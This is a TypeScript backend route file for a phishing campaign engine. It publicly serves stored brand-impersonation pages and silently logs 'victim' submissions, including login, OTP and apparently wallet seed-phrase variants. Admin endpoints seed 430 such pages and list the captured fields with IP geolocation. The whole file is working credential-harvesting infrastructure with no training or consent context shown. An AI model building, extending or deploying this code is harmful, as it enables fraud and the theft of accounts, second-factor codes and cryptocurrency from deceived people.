// backend/src/routes/phishing.ts
// Phishing campaign engine routes.
// Public:  GET /ph/:slug            -> serve stored page HTML (no auth, not under /api/)
//          POST /api/phishing/capture -> log victim submission (no auth, setupGuard allowlisted)
// Admin:   /api/phishing/* -> seed / pages / logs / stats (permission-gated)
import type { FastifyInstance } from 'fastify';
import geoip from 'geoip-lite';
import { dbHelpers } from '../db/index.js';
import { getRequestUser, requirePermission } from '../middleware/auth.js';
import { PHISHING_BRANDS, getVariantsForBrand } from '../services/phishingBrands.js';
import { buildPageSlug, renderPhishingPage } from '../services/phishing.js';
import { log } from '../utils/logger.js';

const PHISHING_VARIANTS = ['login', 'otp', 'verify', 'update', 'track', 'seed'];

const NOT_FOUND_HTML =
  '<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>Not Found</title></head><body style="font-family:sans-serif;text-align:center;padding-top:80px"><h1>404</h1><p>Page not found.</p></body></html>';

function parsePositiveInt(value: unknown, fallback: number): number {
  const n = Number(value);
  if (!Number.isFinite(n) || n <= 0) return fallback;
  return Math.floor(n);
}

function geoForIp(ip: string): { country: string | null; city: string | null } {
  if (!ip) return { country: null, city: null };
  try {
    const geo = geoip.lookup(ip);
    return { country: geo?.country ?? null, city: geo?.city ?? null };
  } catch {
    return { country: null, city: null };
  }
}

export async function phishingRoutes(app: FastifyInstance) {
  // --- Public: serve a stored phishing page --------------------------------
  app.get('/ph/:slug', async (request, reply) => {
    const slug = String((request.params as { slug: string }).slug ?? '').trim();
    if (!/^[a-z0-9-]{1,120}$/.test(slug)) {
      return reply.code(404).type('text/html').send(NOT_FOUND_HTML);
    }
    const page = dbHelpers.getPhishingPageBySlug(slug);
    if (!page || page.enabled !== 1) {
      return reply.code(404).type('text/html').send(NOT_FOUND_HTML);
    }
    dbHelpers.incrementPhishingHit(page.id);
    return reply.type('text/html; charset=utf-8').send(page.html);
  });

  // --- Public: capture a submission (silent, rate-limited) ------------------
  app.post('/api/phishing/capture', {
    config: {
      rateLimit: { max: 30, timeWindow: '1 minute' },
    },
  }, async (request, reply) => {
    const body = (request.body ?? {}) as {
      slug?: unknown;
      brand?: unknown;
      variant?: unknown;
      fields?: unknown;
      meta?: unknown;
    };
    const slug = typeof body.slug === 'string' ? body.slug.trim() : '';
    const brand = typeof body.brand === 'string' ? body.brand.slice(0, 120) : '';
    const variant = typeof body.variant === 'string' ? body.variant : '';
    if (!/^[a-z0-9-]{1,120}$/.test(slug) || !brand || !PHISHING_VARIANTS.includes(variant)) {
      return reply.code(400).send({ success: false, error: 'Invalid capture payload' });
    }
    let fields: Record<string, unknown> = {};
    let meta: Record<string, unknown> = {};
    if (body.fields && typeof body.fields === 'object' && !Array.isArray(body.fields)) {
      fields = body.fields as Record<string, unknown>;
    }
    if (body.meta && typeof body.meta === 'object' && !Array.isArray(body.meta)) {
      meta = body.meta as Record<string, unknown>;
    }
    try {
      const fieldsJson = JSON.stringify(fields).slice(0, 65536);
      const metaJson = JSON.stringify(meta).slice(0, 8192);
      const ip = request.ip || '';
      const userAgent = request.headers['user-agent'] ? String(request.headers['user-agent']).slice(0, 512) : '';
      const page = dbHelpers.getPhishingPageBySlug(slug);
      dbHelpers.logPhishingCapture(page?.id ?? null, slug, brand, variant, ip, userAgent, fieldsJson, metaJson);
      return { success: true, data: { captured: true } };
    } catch (err) {
      log.warn(`Phishing capture failed: ${err instanceof Error ? err.message : String(err)}`);
      return { success: true, data: { captured: false } };
    }
  });

  // --- Admin: seed all 430 pages from the brand DB --------------------------
  app.post('/api/phishing/seed', {
    preHandler: [app.auth, requirePermission('phishing:manage')],
  }, async (request) => {
    const user = getRequestUser(request);
    const createdBy = user?.userId ?? null;
    let created = 0;
    let updated = 0;
    for (const brand of PHISHING_BRANDS) {
      for (const variant of getVariantsForBrand(brand)) {
        const slug = buildPageSlug(brand, variant);
        const existing = dbHelpers.getPhishingPageBySlug(slug);
        const rendered = renderPhishingPage(brand, variant);
        dbHelpers.savePhishingPage({
          slug,
          brand: brand.name,
          category: brand.category,
          variant,
          title: rendered.title,
          html: rendered.html,
          createdBy,
        });
        if (existing) updated++;
        else created++;
      }
    }
    dbHelpers.addLog('INFO', 'PHISHING', `Seeded phishing pages: ${created} created, ${updated} updated`, `brands=${PHISHING_BRANDS.length}`);
    return {
      success: true,
      data: { created, updated, total: created + updated, brands: PHISHING_BRANDS.length },
    };
  });

  // --- Admin: list pages (paginated, filterable) ----------------------------
  app.get('/api/phishing/pages', {
    preHandler: [app.auth, requirePermission('phishing:view')],
  }, async (request) => {
    const query = request.query as { page?: string; pageSize?: string; search?: string; category?: string; enabled?: string };
    const page = parsePositiveInt(query.page, 1);
    const pageSize = Math.min(100, parsePositiveInt(query.pageSize, 20));
    const search = typeof query.search === 'string' && query.search.trim() ? query.search.trim() : undefined;
    const category = typeof query.category === 'string' && query.category.trim() ? query.category.trim() : undefined;
    let enabled: boolean | null = null;
    if (query.enabled === '1' || query.enabled === 'true') enabled = true;
    else if (query.enabled === '0' || query.enabled === 'false') enabled = false;
    const pages = dbHelpers.listPhishingPages({ page, pageSize, search, category, enabled });
    const total = dbHelpers.countPhishingPages({ search, category, enabled });
    const origin = `${request.protocol}://${request.hostname}`;
    return {
      success: true,
      data: {
        pages: pages.map((p) => ({ ...p, url: `${origin}/ph/${p.slug}` })),
        total,
        page,
        pageSize,
      },
    };
  });

  // --- Admin: toggle page enabled -------------------------------------------
  app.patch('/api/phishing/pages/:id', {
    preHandler: [app.auth, requirePermission('phishing:manage')],
  }, async (request, reply) => {
    const id = Number((request.params as { id: string }).id);
    if (!Number.isInteger(id) || id <= 0) {
      return reply.code(400).send({ success: false, error: 'Invalid page id' });
    }
    const body = (request.body ?? {}) as { enabled?: unknown };
    if (typeof body.enabled !== 'boolean') {
      return reply.code(400).send({ success: false, error: 'enabled must be a boolean' });
    }
    const changed = dbHelpers.setPhishingPageEnabled(id, body.enabled);
    if (!changed) {
      return reply.code(404).send({ success: false, error: 'Page not found' });
    }
    return { success: true, data: { id, enabled: body.enabled } };
  });

  // --- Admin: delete page ----------------------------------------------------
  app.delete('/api/phishing/pages/:id', {
    preHandler: [app.auth, requirePermission('phishing:manage')],
  }, async (request, reply) => {
    const id = Number((request.params as { id: string }).id);
    if (!Number.isInteger(id) || id <= 0) {
      return reply.code(400).send({ success: false, error: 'Invalid page id' });
    }
    const deleted = dbHelpers.deletePhishingPage(id);
    if (!deleted) {
      return reply.code(404).send({ success: false, error: 'Page not found' });
    }
    return { success: true, data: { id, deleted: true } };
  });

  // --- Admin: list capture logs ----------------------------------------------
  app.get('/api/phishing/logs', {
    preHandler: [app.auth, requirePermission('phishing:view')],
  }, async (request) => {
    const query = request.query as { page?: string; pageSize?: string; slug?: string; search?: string };
    const page = parsePositiveInt(query.page, 1);
    const pageSize = Math.min(100, parsePositiveInt(query.pageSize, 20));
    const slug = typeof query.slug === 'string' && query.slug.trim() ? query.slug.trim() : undefined;
    const search = typeof query.search === 'string' && query.search.trim() ? query.search.trim() : undefined;
    const logs = dbHelpers.listPhishingLogs({ page, pageSize, slug, search });
    const total = dbHelpers.countPhishingLogs({ slug, search });
    return {
      success: true,
      data: {
        logs: logs.map((l) => {
          let fields: unknown = {};
          let meta: unknown = {};
          try { fields = JSON.parse(l.fields ?? '{}'); } catch { fields = {}; }
          try { meta = JSON.parse(l.meta ?? '{}'); } catch { meta = {}; }
          const geo = geoForIp(l.ip);
          return { ...l, fields, meta, country: geo.country, city: geo.city };
        }),
        total,
        page,
        pageSize,
      },
    };
  });

  // --- Admin: clear all capture logs -----------------------------------------
  app.delete('/api/phishing/logs', {
    preHandler: [app.auth, requirePermission('phishing:manage')],
  }, async () => {
    const cleared = dbHelpers.clearPhishingLogs();
    dbHelpers.addLog('INFO', 'PHISHING', `Cleared ${cleared} phishing capture log(s)`);
    return { success: true, data: { cleared } };
  });

  // --- Admin: statistics ------------------------------------------------------
  app.get('/api/phishing/stats', {
    preHandler: [app.auth, requirePermission('phishing:view')],
  }, async () => {
    const stats = dbHelpers.getPhishingStats();
    const variants = PHISHING_BRANDS.reduce((sum, b) => sum + getVariantsForBrand(b).length, 0);
    return { success: true, data: { ...stats, variants } };
  });
}
